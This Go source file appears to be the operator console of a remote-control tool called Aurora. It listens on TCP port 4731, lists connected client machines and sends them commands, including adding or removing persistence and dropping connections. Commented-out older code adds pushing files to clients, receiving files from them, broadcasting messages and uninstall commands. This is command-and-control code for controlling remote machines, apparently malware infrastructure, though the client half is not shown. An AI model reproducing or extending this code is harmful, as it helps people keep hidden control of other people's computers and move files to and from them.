package internal

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// TODO Find a better way to manage the layout.

// Incoming socket data struct

type Packet struct {
	Type string

	StringData string

	BytePos  int64
	FileData []byte
	Done     bool
}

// CLI interface struct

type Aurora struct {
	listener net.Listener
	scanner  bufio.Scanner
	clients  List
}

func NewAurora() *Aurora {
	aurora := &Aurora{}
	aurora.clients = NewList()
	aurora.scanner = *bufio.NewScanner(os.Stdin)
	return aurora
}

func (aurora *Aurora) Start() {
	clearScreen()
	for {
		if aurora.listener == nil {
			var err error
			aurora.listener, err = net.Listen("tcp", ":4731")
			if err != nil {
				fmt.Println("Error while accepting connections -" + err.Error())
				aurora.listener = nil
			} else {
				fmt.Println("Now accepting connections.")
				go aurora.startListening()
			}
		} else {
			aurora.handleCommands()
		}
	}

}

func (aurora *Aurora) startListening() {
	for {
		conn, err := aurora.listener.Accept()
		if err != nil {
			//fmt.Println("Error while accepting connection -" + err.Error())
			break
		} else {
			//fmt.Println("New connection from" + conn.RemoteAddr().String())
			aurora.addConnections(conn)
			// TODO handle packets
		}
	}
}

func (aurora *Aurora) stopListening() {
	aurora.listener.Close()
	aurora.clients.Clear()
}

// TODO Handle different net.Listener errors differently.
func (aurora *Aurora) handleListenerError(err error) {
	//if err ==  {
	//
	//}
}

func (aurora *Aurora) handleCommands() {
	for {
		printMenu()
		input := aurora.getInput()
		inArray := strings.Split(input, " ")
		clearScreen()
		switch inArray[0] {
		case "1":
			aurora.pingClient()
		case "2":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "REMOVE")
				} else {
					aurora.simplePacket(index, "REMOVE")
				}
			} else {
				aurora.simplePacket(-1, "REMOVE")
			}
		case "3":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "PERSISTENCE")
				} else {
					aurora.simplePacket(index, "PERSISTENCE")
				}
			} else {
				aurora.simplePacket(-1, "PERSISTENCE")
			}
		case "4":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "RMPERSISTENCE")
				} else {
					aurora.simplePacket(index, "RMPERSISTENCE")
				}
			} else {
				aurora.simplePacket(-1, "RMPERSISTENCE")
			}
		case "5":
			clearScreen()
			os.Exit(0)
		default:
			invalidCommand()
			aurora.getInput()
		}
		clearScreen()
	}
}

func (aurora *Aurora) handlePackets() {

}

func (aurora *Aurora) addConnections(conn net.Conn) {
	aurora.clients.Add(conn)
}

func (aurora *Aurora) removeConnection(conn net.Conn) {
	aurora.clients.Remove(conn)
}

// Util Functions

func (aurora *Aurora) getInput() string {
	aurora.scanner.Scan()
	cmd := aurora.scanner.Text()
	cmd = strings.Trim(cmd, "\n")
	return cmd
}

func clearScreen() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// Commands

func (aurora *Aurora) pingClient() {
	for _, client := range aurora.clients.All() {
		enc := client.GetEncoder()
		err := enc.Encode(Packet{"PING", "", 0, nil, false})
		if err != nil {
			aurora.removeConnection(client.GetConn())
			fmt.Println(err)
		}
	}
	printLogo()
	var i int
	for index, client := range aurora.clients.All() {
		ip := client.GetConn().RemoteAddr().String()
		ip = strings.Split(ip, ":")[0]
		str := "| " + strconv.Itoa(index) + " | " + ip
		for i = 0; i < 27; i++ {
			if i == 0 || i == 4 || i == 26 {
				fmt.Print("+")
			} else {
				fmt.Print("-")
			}
		}
		fmt.Println()
		fmt.Print(str)
		for i := len(str); i < 26; i++ {
			fmt.Print(" ")
		}
		fmt.Println("|")
	}
	if i != 0 {
		fmt.Println("+---+---------------------+")
	} else {
		fmt.Println("+-------------------------+")
	}
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
	aurora.getInput()
}

func (aurora *Aurora) simplePacket(index int, packet string) {
	if index != -1 && aurora.clients.Get(index) != (Client{}) {
		if index == -99 {
			for _, client := range aurora.clients.All() {
				if packet == "REMOVE" {
					aurora.removeConnection(client.GetConn())
				}
				enc := client.GetEncoder()
				err := enc.Encode(Packet{packet, "", 0, nil, false})
				if err != nil {
					fmt.Println(err)
					aurora.removeConnection(client.GetConn())
				}
			}
		} else {
			cl := aurora.clients.Get(index)
			enc := cl.GetEncoder()
			err := enc.Encode(Packet{packet, "", 0, nil, false})
			if err != nil {
				fmt.Println(err)
				aurora.removeConnection(cl.GetConn())
			}
		}
		printLogo()
		switch packet {
		case "PERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|    Persistence Added    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "RMPERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Persistence Removed   |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "REMOVE":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Connection Removed    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		}
		aurora.getInput()
	} else {
		printLogo()
		fmt.Println("+-------------------------+")
		fmt.Println("|  Connection Not Found   |")
		fmt.Println("| Press Enter To Continue |")
		fmt.Println("+-------------------------+")
		aurora.getInput()
	}
}

// Menu Layout

func invalidCommand() {
	printLogo()
	fmt.Println("+-------------------------+")
	fmt.Println("|     Invalid Command     |")
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
}

func printLogo() {
	fmt.Println("   _____                                    ")
	fmt.Println("  /  _  \\  __ _________  ________________   ")
	fmt.Println(" /  /_\\  \\|  |  \\_  __ \\/  _ \\_  __ \\__  \\  ")
	fmt.Println("/    |    \\  |  /|  | \\(  <_> )  | \\// __ \\_")
	fmt.Println("\\____|__  /____/ |__|   \\____/|__|  (____  /")
	fmt.Println("        \\/                               \\/ ")
}

func printMenu() {
	printLogo()
	fmt.Println("+-------------+")
	fmt.Println("| Commands    |")
	fmt.Println("+---+---------+")
	fmt.Println("| 1 | Ping    |")
	fmt.Println("| 2 | Remove  |")
	fmt.Println("| 3 | Persist |")
	fmt.Println("| 4 | Rm Prst |")
	fmt.Println("| 5 | Exit    |")
	fmt.Println("+---+---------+")
	fmt.Print("\nEnter Command: ")
}

// OLD CODE

//
//func (aurora *Aurora) Init() {
//	var err error
//
//	aurora.connections = NewList()
//
//	aurora.workingDirectory, _ = filepath.Abs(filepath.Dir(os.Args[0]))
//	aurora.downloadDirectory, err = filepath.Abs(aurora.workingDirectory + "\\Downloads")
//	if err != nil {
//		fmt.Println(err)
//	}
//	go aurora.listen()
//	for {
//		buf := bufio.NewReader(os.Stdin)
//		data, _, err := buf.ReadLine()
//		if err != nil {
//			fmt.Println(err)
//		}
//
//		msg := string(data)
//		parts := strings.Split(msg, " ")
//		index, _ := strconv.Atoi(parts[0])
//
//		for len(parts) < 3 {
//			parts = append(parts, "")
//		}
//
//		aurora.sendPackets(index, parts[1], parts[2])
//	}
//
//}
//
//func (aurora *Aurora) sendPackets(index int, packetType string, msg string) {
//	chosenConn := aurora.connections.Get(index)
//	if chosenConn.GetConn() == nil {
//		index = -1
//	}
//	switch packetType {
//	case "file":
//		aurora.uploadFile(aurora.connections.Get(0).GetConn(), msg)
//	case "p":
//		if index >= 0 {
//			aurora.connections.Get(index).GetEncoder().Encode(Packet{"P", "", 0, nil, false})
//		} else {
//			for _, conn := range aurora.connections.All() {
//				err := conn.GetEncoder().Encode(Packet{"P", "", 0, nil, false})
//				if err != nil {
//					aurora.removeConnection(conn.GetConn())
//					fmt.Println(err)
//				}
//			}
//		}
//	case "rp":
//		if index >= 0 {
//			aurora.connections.Get(index).GetEncoder().Encode(Packet{"RP", "", 0, nil, false})
//		} else {
//			for _, conn := range aurora.connections.All() {
//				err := conn.GetEncoder().Encode(Packet{"RP", "", 0, nil, false})
//				if err != nil {
//					aurora.removeConnection(conn.GetConn())
//					fmt.Println(err)
//				}
//			}
//		}
//	case "msg":
//		if index >= 0 {
//			aurora.connections.Get(index).GetEncoder().Encode(Packet{"MSG", msg, 0, nil, false})
//		} else {
//			for _, conn := range aurora.connections.All() {
//				err := conn.GetEncoder().Encode(Packet{"MSG", msg, 0, nil, false})
//				if err != nil {
//					aurora.removeConnection(conn.GetConn())
//					fmt.Println(err)
//				}
//			}
//		}
//	case "uninstall":
//		if index >= 0 {
//			aurora.connections.Get(index).GetEncoder().Encode(Packet{"UNINSTALL", "", 0, nil, false})
//		} else {
//			for _, conn := range aurora.connections.All() {
//				err := conn.GetEncoder().Encode(Packet{"UNINSTALL", "", 0, nil, false})
//				if err != nil {
//					aurora.removeConnection(conn.GetConn())
//					fmt.Println(err)
//				}
//			}
//		}
//	case "live":
//		for _, conn := range aurora.connections.All() {
//			err := conn.GetEncoder().Encode(Packet{"PING", "", 0, nil, false})
//			if err != nil {
//				aurora.removeConnection(conn.GetConn())
//				fmt.Println(err)
//			}
//		}
//		for index, conn := range aurora.connections.All() {
//			fmt.Println(index, conn.GetConn().RemoteAddr())
//		}
//	case "dc":
//		for _, conn := range aurora.connections.All() {
//			err := conn.GetEncoder().Encode(Packet{"DC", "", 0, nil, false})
//			if err != nil {
//				aurora.removeConnection(conn.GetConn())
//				fmt.Println(err)
//			}
//		}
//	default:
//	}
//}
//
//func (aurora *Aurora) listen() {
//	var err error
//	aurora.listener, err = net.Listen("tcp", ":4731")
//	fmt.Println("Aurora: Now accepting connections.")
//	if err != nil {
//		fmt.Println(err)
//	}
//	for {
//		conn, err := aurora.listener.Accept()
//		if err != nil {
//			fmt.Println(err)
//		}
//		fmt.Println("Aurora: New connection from", conn.RemoteAddr())
//		aurora.addConnections(conn)
//		go aurora.handlePackets(conn)
//	}
//}
//
//func (aurora *Aurora) uploadFile(conn net.Conn, fileName string) {
//	buffer := make([]byte, 1024)
//	file, _ := os.Open(fileName)
//	defer file.Close()
//
//	i := 0
//	for {
//		_, err := file.Read(buffer)
//		if err == io.EOF {
//			err = aurora.encoders[conn].Encode(Packet{"FILE", fileName, 0, nil, true})
//			if err != nil {
//				aurora.removeConnection(conn)
//				fmt.Println(err)
//			}
//			break
//		}
//		err = aurora.encoders[conn].Encode(Packet{"FILE", fileName, int64(i), buffer, false})
//		if err != nil {
//			aurora.removeConnection(conn)
//			fmt.Println(err)
//		}
//		i++
//	}
//}
//
//func (aurora *Aurora) handlePackets(conn net.Conn) {
//	files := map[string]*os.File{}
//	for {
//		packet := Packet{}
//		err := aurora.decoders[conn].Decode(&packet)
//		if err == io.EOF {
//			break
//		} else if err != nil {
//			fmt.Println(err)
//			if err != nil {
//				aurora.removeConnection(conn)
//				fmt.Println(err)
//			}
//			return
//		} else {
//			switch packet.Type {
//			case "FILE":
//				if _, err := os.Stat(aurora.downloadDirectory); os.IsNotExist(err) {
//					err := os.MkdirAll(aurora.downloadDirectory, os.ModeDir)
//					if err != nil {
//						fmt.Println(err)
//					}
//				}
//				fileName := aurora.downloadDirectory + "\\" + packet.StringData
//				if packet.Done && files[fileName] != nil {
//					files[fileName].Close()
//					fmt.Println("Aurora: Finished downloading", packet.StringData)
//					delete(files, fileName)
//				} else if packet.Done && files[fileName] == nil {
//					continue
//				} else {
//					if files[fileName] == nil {
//						fmt.Println("Aurora: Started downloading", packet.StringData)
//						if _, err := os.Stat(fileName); os.IsNotExist(err) {
//							files[fileName], _ = os.Create(fileName)
//						} else {
//							files[fileName], _ = os.Open(fileName)
//						}
//						defer files[fileName].Close()
//					}
//					files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
//				}
//			case "MESSAGE":
//				fmt.Println("Aurora: incoming message \"" + string(packet.FileData) + "\"")
//			}
//		}
//	}
//}
//
//// Add or remove a connection.
//
